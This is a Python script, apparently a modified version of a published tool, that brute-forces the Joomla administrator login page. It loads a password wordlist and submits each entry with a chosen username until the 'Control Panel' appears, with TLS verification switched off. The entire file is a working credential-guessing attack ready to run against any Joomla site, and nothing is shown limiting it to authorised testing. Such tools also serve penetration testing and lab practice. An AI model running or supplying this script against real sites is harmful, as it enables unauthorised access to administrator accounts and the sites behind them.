#!/usr/bin/env python3
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "robobrowser",
#     "werkzeug",
# ]
# ///

# -*- coding: utf-8 -*-
#
# Joomla (3.8.8) Admin Bruteforcer
# Modified by x7331: Python3 + Progress Bar + Simplified single-threaded run
# Original Author: Fabrizio Siciliano (@0rbz_)
#

import werkzeug
werkzeug.cached_property = werkzeug.utils.cached_property
from robobrowser import RoboBrowser
import re
import sys
import time
import argparse
import warnings
from tqdm import tqdm

if not sys.warnoptions:
    warnings.simplefilter("ignore")

print('''
 ▐▄▄▄            • ▌ ▄ ·. ▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄▄▄▄ .
  ·██▪     ▪     ·██ ▐███▪▐█ ▀█▪▀▄ █·█▪██▌•██  ▀▄.▀·
▪▄ ██ ▄█▀▄  ▄█▀▄ ▐█ ▌▐▌▐█·▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▐▀▀▪▄
▐▌▐█▌▐█▌.▐▌▐█▌.▐▌██ ██▌▐█▌██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█▄▄▌
 ▀▀▀• ▀█▄▀▪ ▀█▄▀▪▀▀  █▪▀▀▀·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀ v.2.6
         Author: Fabrizio Siciliano (@0rbz_)
         Python3 + Progress Bar by x7331 (single-threaded)
''')

def parse_args():
    parser = argparse.ArgumentParser(
        description="Joomla Administrator Bruteforcer",
        epilog="Example: python3 joombrute.py --url http://site/administrator --username user --wordlist passwords.txt")
    parser.add_argument('--url', type=str, required=True, help='Target Admin URL, i.e., http://site/administrator')
    parser.add_argument('--username', type=str, required=True, help='User Name')
    parser.add_argument('--wordlist', type=str, required=True, help='Password List')
    parser.add_argument('--ua', type=str, default="JoomBrute/1.0", help='User-Agent')
    parser.add_argument('--delay', type=float, default=0.0, help='Delay between attempts (seconds)')
    return parser.parse_args()

args = parse_args()

try:
    with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]
    print(f"[+] Loaded {len(passwords)} passwords.")
except FileNotFoundError:
    print(f"[!] Can't find {args.wordlist}. Does it exist?")
    sys.exit(1)

def try_login(password):
    try:
        browser = RoboBrowser(history=False, user_agent=args.ua)
        browser.open(args.url, verify=False)
        form = browser.get_form()
        form['username'].value = args.username
        form['passwd'].value = password
        browser.submit_form(form)
        found = browser.find_all(text=re.compile('Control Panel'))
        return bool(found)
    except Exception:
        return False

def main():
    for pwd in tqdm(passwords, desc="Bruteforcing", ncols=70, bar_format="{desc} {percentage:3.0f}%|{bar}| {n_fmt}/{total_fmt}"):
        if try_login(pwd):
            print(f"\n[!] Cracked: {args.username} : {pwd}")
            return
        if args.delay > 0:
            time.sleep(args.delay)
    print("\n[-] No valid credentials found.")

if __name__ == "__main__":
    main()
